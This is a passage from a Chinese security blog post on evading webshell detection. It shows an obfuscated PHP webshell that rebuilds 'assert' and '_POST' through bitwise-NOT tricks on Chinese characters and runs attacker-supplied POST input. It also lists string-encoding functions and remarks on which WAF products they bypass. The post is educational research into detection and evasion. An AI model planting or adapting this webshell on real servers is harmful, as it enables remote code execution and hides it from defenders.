+<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2021/12/22/UyrWzGQ5hZNSJe8.png" alt="image-20211222221401125"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$__</span>=(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>)+(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>);</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$__</span>/<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$____</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$___</span>=<span class="string">&quot;瞰&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;和&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;和&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;的&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;半&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;始&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable">$_____</span>=<span class="string">&#x27;_&#x27;</span>;<span class="variable">$___</span>=<span class="string">&quot;俯&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;瞰&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;次&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;站&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$_____</span>;</span><br><span class="line"><span class="variable">$____</span>(<span class="variable">$_</span>[<span class="variable">$__</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// [POST] 2=phpinfo()</span></span><br></pre></td></tr></table></figure>
+<p>这里还利用了PHP的弱类型特性。因为要获取’和’{2}，就必须有数字2。而PHP由于弱类型这个特性，true的值为1，故true+true==2，也就是(‘&gt;’&gt;’&lt;’)+(‘&gt;’&gt;’&lt;’)==2。</p>
+<p>上面这种方法看起来真的很酷炫 , 但是尽管变化成这样 , 还是有很多 WAF 可以检测到的。</p>
+<h3 id="字符串变形与编码"><a href="#字符串变形与编码" class="headerlink" title="字符串变形与编码"></a>字符串变形与编码</h3><ul>
+<li>substr()：返回字符串的一部分</li>
+<li>strtr()：转换字符串中特定的字符</li>
+<li>str_replace()：其他字符替换字符串中的一些字符</li>
+<li>substr_replace()：把字符串的一部分替换为另一个字符串</li>
+<li>trim()：移除字符串两侧的空白字符或其他预定义字符</li>
+<li>base64_encode()：对使用 MIME base64 编码的数据进行编码</li>
+<li>base64_decode()：对使用 MIME base64 编码的数据进行解码</li>
+<li>chr()：从指定的十进制ASCII编码返回字符</li>
+<li>hexdec()：十六进制转换为十进制</li>
+<li>str_rot13()：对字符串执行 ROT13 编码。</li>
+</ul>
+<blockquote>
+<p>注：字符串的变形可以很容易地绕过安全狗，但对于D盾的话效果甚微。</p>
+</blockquote>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1625439">WebShell通用免杀的思考 - 云+社区 - 腾讯云 (tencent.com)</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44604541/article/details/118695035">webshell免杀的一些学习和思考——以PHP为例_闵行小鱼塘-CSDN博客</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/183520.html">Webshell入侵检测初探（一） - FreeBuf网络安全行业门户</a></li>
+<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/197553954">污点传递理论在Webshell检测中的应用 — PHP篇 - 知乎 (zhihu.com)</a></li>
+<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/259985000">Webshell研究综述：检测与对抗技术的动态博弈进展 - 知乎 (zhihu.com)</a></li>
+<li>腾讯TEG安全平台部lake2 / 杜海章 演讲 《纵深防御之WebShell攻防》</li>
+<li><a target="_blank" rel="noopener" href="https://www.cnki.com.cn/Article/CJFDTotal-AQJS201902004.htm">基于语义分析和神经网络的WebShell检测方法—《网络空间安全》2019年02期 (cnki.com.cn)</a></li>
+<li><a target="_blank" rel="noopener" href="https://paper.seebug.org/526/#_10">初探机器学习检测 PHP Webshell (seebug.org)</a></li>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/j7gPuNg6dR5VQISOxeWCyA">红与蓝：现代Webshell检测引擎免杀对抗与实践 (qq.com)</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/knownsec/KCon/blob/master/2019/25日/PHP动态特性的捕捉与逃逸.pdf">KCon/PHP动态特性的捕捉与逃逸.pdf at master · knownsec/KCon (github.com)</a></li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Ulysses</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://plumeria.ltd/post/db07a2af.html">https://plumeria.ltd/post/db07a2af.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://plumeria.ltd" target="_blank">Ulysses'Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/WebShell/">WebShell</a></div><div class="post_share"><div class="social-share" data-image="/img/cover/webshell1.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/post/e6a9f884.html"><img class="prev-cover" src="/img/gif/loading4.gif" data-original="/img/cover/webshell2.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">WebShell检测绕过之下·有的放矢</div></div></a></div><div class="next-post pull-right"><a href="/post/4612b439.html"><img class="next-cover" src="/img/gif/loading4.gif" data-original="/img/cover/webshell.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">WebShell基础详解</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/post/4612b439.html" title="WebShell基础详解"><img class="cover" src="/img/gif/loading4.gif" data-original="/img/cover/webshell.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-12-15</div><div class="title">WebShell基础详解</div></div></a></div><div><a href="/post/e6a9f884.html" title="WebShell检测绕过之下·有的放矢"><img class="cover" src="/img/gif/loading4.gif" data-original="/img/cover/webshell2.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-12-23</div><div class="title">WebShell检测绕过之下·有的放矢</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/gif/loading4.gif" data-original="https://avatars.githubusercontent.com/u/63300491?v=4" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Ulysses</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">52</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">15</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/UlyssesTakusen"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">记录学习与生活~</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#WebShell%E5%8E%9F%E7%90%86%E5%9B%9E%E9%A1%BE"><span class="toc-number">1.</span> <span class="toc-text">WebShell原理回顾</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E4%BC%A0%E9%80%92"><span class="toc-number">1.0.1.</span> <span class="toc-text">数据传递</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">1.0.2.</span> <span class="toc-text">代码执行</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WebShell%E4%B8%BB%E6%B5%81%E6%A3%80%E6%B5%8B%E6%89%8B%E6%AE%B5"><span class="toc-number">2.</span> <span class="toc-text">WebShell主流检测手段</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E6%AD%A3%E5%88%99%E6%96%87%E6%9C%AC%E7%89%B9%E5%BE%81"><span class="toc-number">2.1.</span> <span class="toc-text">基于正则文本特征</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E7%BB%9F%E8%AE%A1%E7%89%B9%E5%BE%81"><span class="toc-number">2.2.</span> <span class="toc-text">基于统计特征</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8EAST%E8%AF%AD%E6%B3%95%E6%A0%91"><span class="toc-number">2.3.</span> <span class="toc-text">基于AST语法树</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A8-%E9%9D%99%E6%80%81%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C"><span class="toc-number">2.4.</span> <span class="toc-text">动&#x2F;静态符号执行</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90"><span class="toc-number">2.4.1.</span> <span class="toc-text">静态污点分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90"><span class="toc-number">2.4.2.</span> <span class="toc-text">动态污点分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B1%A1%E7%82%B9%E4%BC%A0%E9%80%92%E7%90%86%E8%AE%BA%E6%A6%82%E8%BF%B0"><span class="toc-number">2.4.3.</span> <span class="toc-text">污点传递理论概述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A5PHP%E4%B8%BA%E4%BE%8B%E7%9A%84%E6%B1%A1%E7%82%B9%E4%BC%A0%E9%80%92%E8%BF%87%E7%A8%8B"><span class="toc-number">2.4.4.</span> <span class="toc-text">以PHP为例的污点传递过程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0"><span class="toc-number">2.5.</span> <span class="toc-text">基于机器学习&#x2F;深度学习</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B2%99%E7%AE%B1"><span class="toc-number">2.6.</span> <span class="toc-text">沙箱</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E6%97%A5%E5%BF%97%E6%A3%80%E6%B5%8B"><span class="toc-number">2.7.</span> <span class="toc-text">流量日志检测</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E8%AF%AD%E6%B3%95%E7%89%B9%E6%80%A7"><span class="toc-number">3.</span> <span class="toc-text">PHP语法特性</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E8%BD%AC%E4%B9%89%E8%A1%A8%E7%A4%BA"><span class="toc-number">3.1.</span> <span class="toc-text">PHP字符串的转义表示</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E7%9A%84%E4%B8%8D%E5%90%8C%E6%A0%87%E8%AE%B0%E9%A3%8E%E6%A0%BC"><span class="toc-number">3.2.</span> <span class="toc-text">PHP的不同标记风格</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E5%AF%B9%E6%9C%AA%E5%AE%9A%E4%B9%89%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%A4%84%E7%90%86"><span class="toc-number">3.3.</span> <span class="toc-text">PHP对未定义字符串的处理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0-get-defined-functions"><span class="toc-number">3.4.</span> <span class="toc-text">PHP内建函数 get_defined_functions</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E9%80%9A%E8%BF%87define-%E5%AE%9A%E4%B9%89%E5%B8%B8%E9%87%8F%E6%95%B0%E7%BB%84"><span class="toc-number">3.5.</span> <span class="toc-text">PHP通过define()定义常量数组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E8%BF%94%E5%9B%9E%E5%80%BC%E7%B1%BB%E5%9E%8B%E5%A3%B0%E6%98%8E"><span class="toc-number">3.6.</span> <span class="toc-text">PHP返回值类型声明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F-%E5%8F%82%E6%95%B0%E4%BC%A0%E9%80%92"><span class="toc-number">3.7.</span> <span class="toc-text">全局变量-参数传递</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B6%85%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F"><span class="toc-number">3.7.1.</span> <span class="toc-text">超全局变量</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#GET"><span class="toc-number">3.7.1.1.</span> <span class="toc-text">$_GET</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#POST"><span class="toc-number">3.7.1.2.</span> <span class="toc-text">$_POST</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REQUEST"><span class="toc-number">3.7.1.3.</span> <span class="toc-text">$_REQUEST</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#COOKIE"><span class="toc-number">3.7.1.4.</span> <span class="toc-text">$_COOKIE</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#FILE"><span class="toc-number">3.7.1.5.</span> <span class="toc-text">$_FILE</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SERVER"><span class="toc-number">3.7.1.6.</span> <span class="toc-text">$_SERVER</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ENV"><span class="toc-number">3.7.1.7.</span> <span class="toc-text">$_ENV</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#GLOBALS%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F"><span class="toc-number">3.7.2.</span> <span class="toc-text">$GLOBALS全局变量</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E5%8F%98%E9%95%BF%E5%8F%82%E6%95%B0"><span class="toc-number">3.8.</span> <span class="toc-text">PHP变长参数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP7%E4%B8%8B%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%89%A7%E8%A1%8C%E9%A1%BA%E5%BA%8F"><span class="toc-number">3.9.</span> <span class="toc-text">PHP7下表达式执行顺序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%82%E6%88%96%E5%8F%96%E5%8F%8D%E8%BF%90%E7%AE%97"><span class="toc-number">3.10.</span> <span class="toc-text">异或取反运算</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%82%E6%88%96%E8%BF%90%E7%AE%97"><span class="toc-number">3.10.1.</span> <span class="toc-text">异或运算</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%96%E5%8F%8D%E8%BF%90%E7%AE%97"><span class="toc-number">3.10.2.</span> <span class="toc-text">取反运算</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8F%98%E5%BD%A2%E4%B8%8E%E7%BC%96%E7%A0%81"><span class="toc-number">3.11.</span> <span class="toc-text">字符串变形与编码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">4.</span> <span class="toc-text">参考资料</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/post/e6a9f884.html" title="WebShell检测绕过之下·有的放矢"><img src="/img/gif/loading4.gif" data-original="/img/cover/webshell2.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="WebShell检测绕过之下·有的放矢"/></a><div class="content"><a class="title" href="/post/e6a9f884.html" title="WebShell检测绕过之下·有的放矢">WebShell检测绕过之下·有的放矢</a><time datetime="2021-12-23T11:00:00.000Z" title="发表于 2021-12-23 19:00:00">2021-12-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/db07a2af.html" title="WebShell检测绕过之上·知己知彼"><img src="/img/gif/loading4.gif" data-original="/img/cover/webshell1.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="WebShell检测绕过之上·知己知彼"/></a><div class="content"><a class="title" href="/post/db07a2af.html" title="WebShell检测绕过之上·知己知彼">WebShell检测绕过之上·知己知彼</a><time datetime="2021-12-20T11:00:00.000Z" title="发表于 2021-12-20 19:00:00">2021-12-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/4612b439.html" title="WebShell基础详解"><img src="/img/gif/loading4.gif" data-original="/img/cover/webshell.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="WebShell基础详解"/></a><div class="content"><a class="title" href="/post/4612b439.html" title="WebShell基础详解">WebShell基础详解</a><time datetime="2021-12-15T11:00:00.000Z" title="发表于 2021-12-15 19:00:00">2021-12-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/a43e8dc0.html" title="命令执行漏洞"><img src="/img/gif/loading4.gif" data-original="/img/cover/rce2.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="命令执行漏洞"/></a><div class="content"><a class="title" href="/post/a43e8dc0.html" title="命令执行漏洞">命令执行漏洞</a><time datetime="2021-12-13T03:00:00.000Z" title="发表于 2021-12-13 11:00:00">2021-12-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/7e08ba9.html" title="代码执行漏洞"><img src="/img/gif/loading4.gif" data-original="/img/cover/rce1.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="代码执行漏洞"/></a><div class="content"><a class="title" href="/post/7e08ba9.html" title="代码执行漏洞">代码执行漏洞</a><time datetime="2021-12-10T06:00:00.000Z" title="发表于 2021-12-10 14:00:00">2021-12-10</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By Ulysses</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="algolia-search"><div class="search-dialog"><div class="search-dialog__title" id="algolia-search-title">Algolia</div><div id="algolia-input-panel"><div id="algolia-search-input"></div></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-stats"></div></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/search/algolia.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'iuIup4lvgEwLDu3U8Qc3GOXd-gzGzoHsz',
+      appKey: 'Ls9mJKS2MmvbfsPbPCeb2cnA',
+      placeholder: 'Please leave your footprints',
+      avatar: 'monsterid',
+      meta: 'nick,mail,link'.split(','),
+      pageSize: '10',
+      lang: 'zh-CN',
+      recordIP: false,
+      serverURLs: '',
+      emojiCDN: '',
+      emojiMaps: "",
+      enableQQ: false,
+      master: '5671db8c5f953943b68468c62e317e7e,007d3a0fdf1072ff1db83a005457a3c9,503ee756200f9eba794e5467c89e98f8,048233cc2ce6903ca93ba6e0597462ae'.split(','),
+      friends: ''.split(','),
+      tagMeta: '博主,小伙伴,访客'.split(','),
+      path: window.location.pathname,
+      requiredFields: ["nick,mail"],
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/gh/HCLonely/Valine@latest/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script src="/js/smooth-scrolling.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = [
+  'title',
+  '#config-diff',
+  '#body-wrap',
+  '#rightside-config-hide',
+  '#rightside-config-show',
+  '.js-pjax'
+]
+
+if (false) {
+  pjaxSelectors.unshift('meta[property="og:image"]', 'meta[property="og:title"]', 'meta[property="og:url"]')
+}
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.removeEventListener('scroll', window.tocScrollFn)
+  window.removeEventListener('scroll', scrollCollect)
+
+  typeof preloader === 'object' && preloader.initLoading()
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // Analytics
+  if (false) {
+    MtaH5.pgv()
+  }
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+
+  typeof preloader === 'object' && preloader.endLoading()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --><script data-pjax>
+  function butterfly_clock_injector_config(){
+    var parent_div_git = document.getElementsByClassName('sticky_layout')[0];
+    var item_html = '<div class="card-widget card-clock"><div class="card-glass"><div class="card-background"><div class="card-content"><div id="hexo_electric_clock"><img class="entered loading" id="card-clock-loading" src="/img/gif/loading4.gif" data-original="/img/loading.gif" style="height: 120px; width: 100%;" data-ll-status="loading"/></div></div></div></div></div>';
+    console.log('已挂载butterfly_clock')
+    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+    }
+  var elist = 'null'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var flag = 0;
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_clock_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_clock_injector_config();
+  }
+  </script><script src="https://pv.sohu.com/cityjson?ie=utf-8"></script><script data-pjax src="https://cdn.jsdelivr.net/npm/hexo-butterfly-clock/lib/clock.min.js"></script><script data-pjax>
+  function butterfly_swiper_injector_config(){
+    var parent_div_git = document.getElementById('recent-posts');
+    var item_html = '<div class="recent-post-item" style="height: auto;width: 100%"><div class="blog-slider swiper-container-fade swiper-container-horizontal" id="swiper_container"><div class="blog-slider__wrp swiper-wrapper" style="transition-duration: 0ms;"><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="post/e2e31796.html" alt=""><img width="48" height="48" src="/img/gif/loading4.gif" data-original="/img/cover/yunsuo.jpg" alt="" onerror="this.src=https://cdn.jsdelivr.net/npm/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2021-10-23</span><a class="blog-slider__title" href="post/e2e31796.html" alt="">WAF-Bypass之SQL注入绕过云锁</a><div class="blog-slider__text">本文主要介绍:如何科学地绕过云锁WAF</div><a class="blog-slider__button" href="post/e2e31796.html" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="post/e1e1fb64.html" alt=""><img width="48" height="48" src="/img/gif/loading4.gif" data-original="/img/cover/waf.png" alt="" onerror="this.src=https://cdn.jsdelivr.net/npm/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2021-10-14</span><a class="blog-slider__title" href="post/e1e1fb64.html" alt="">WAF-Bypass之WAF介绍与分析</a><div class="blog-slider__text">本文主要介绍:WAF的工作原理以及部署方式</div><a class="blog-slider__button" href="post/e1e1fb64.html" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="post/8bdb3c95.html" alt=""><img width="48" height="48" 